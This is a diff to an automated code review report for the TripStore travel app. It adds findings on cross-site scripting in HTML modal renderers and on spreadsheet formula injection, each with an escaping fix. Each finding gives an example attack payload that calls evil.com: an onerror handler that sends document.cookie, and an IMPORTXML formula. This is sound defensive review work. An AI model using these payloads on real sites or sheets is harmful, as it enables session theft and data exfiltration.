@@ -1,5 +1,5 @@
 # TripStore Code Review Report
-**Date:** 2026-06-07
+**Date:** 2026-06-08
 **Reviewer:** Automated Daily Review
 **Files Reviewed:** Code.gs, Pipeline.gs, Quote_Intelligence.gs, index_fit.tripstore.html, write_to_sheets.py, archive_to_input.py
 **Files Not Found (not in repo):** extract_itineraries.py, write_inputs_to_sheets.py, cleanup_sheet.py, clean_pipeline_data.py, cross_reference.py, enrich_hotels.py, enrich_hotels_booking.py
@@ -11,9 +11,9 @@
 | Severity | Count |
 |----------|-------|
 | CRITICAL | 5 |
-| MODERATE | 8 |
+| MODERATE | 10 |
 | MINOR | 7 |
-| **TOTAL** | **20** |
+| **TOTAL** | **22** |
 
 ---
 
@@ -72,6 +72,39 @@
 **File:** Code.gs — `getAllSaved()` line 299, `searchItinerary()` line 321
 **Issue:** Both functions are callable by anyone who knows the API URL. `getAllSaved()` returns the full client name list. `searchItinerary()` returns the entire saved JSON payload for any pax name — hotel selections, costs, travel dates.
 **Fix:** Require a signed token or session secret in the request, verified against Script Properties server-side.
+
+---
+
+### M2b — XSS via Unescaped Server Data in innerHTML Templates (index_fit.tripstore.html, lines 1601, 1604, 1828)
+**File:** index_fit.tripstore.html — hotel/transfer/sightseeing modal renderers
+**Issue:** Hotel names, city names, tour names, and transfer route strings fetched from Google Sheets are interpolated directly into `innerHTML` template literals without HTML escaping:
+```js
+`<span class="...">${t.city || 'N/A'}</span>`   // line 1601
+`<p class="...">${t.from} ➔ ${t.to}</p>`         // line 1604
+`<div class="...">${h.name}</div>`                // line 1828
+```
+A sheet row containing `<img src=x onerror="fetch('https://evil.com?c='+document.cookie)">` as a hotel name would execute in every agent's browser when they open the picker modal. Note: the transfer modal has a partial `esc()` helper (line 1586) but it is only applied to `onclick` attribute values, not to rendered display text.
+**Fix:** Apply a consistent escape helper to all rendered values:
+```js
+const esc = s => String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+```
+
+---
+
+### M2c — Google Sheets Formula Injection via User Inputs (Code.gs, lines 289, 362)
+**File:** Code.gs — `handleSignup()` line 289, `saveItinerary()` line 362
+**Issue:** User-supplied values (username, paxName) are written to Google Sheets via `appendRow()` / `setValue()` without sanitisation. A pax name starting with `=` is treated as a live formula:
+```
+paxName = "=IMPORTXML(\"https://evil.com\",\"//a\")"
+```
+This executes when the sheet is opened, potentially exfiltrating data or corrupting rows.
+**Fix:** Prefix any user-supplied string that starts with `=`, `+`, `-`, or `@` with a single quote before writing, forcing Sheets to treat it as text:
+```js
+function sanitizeForSheet(v) {
+  const s = String(v||'').trim();
+  return /^[=+\-@]/.test(s) ? "'" + s : s;
+}
+```
 
 ---
 
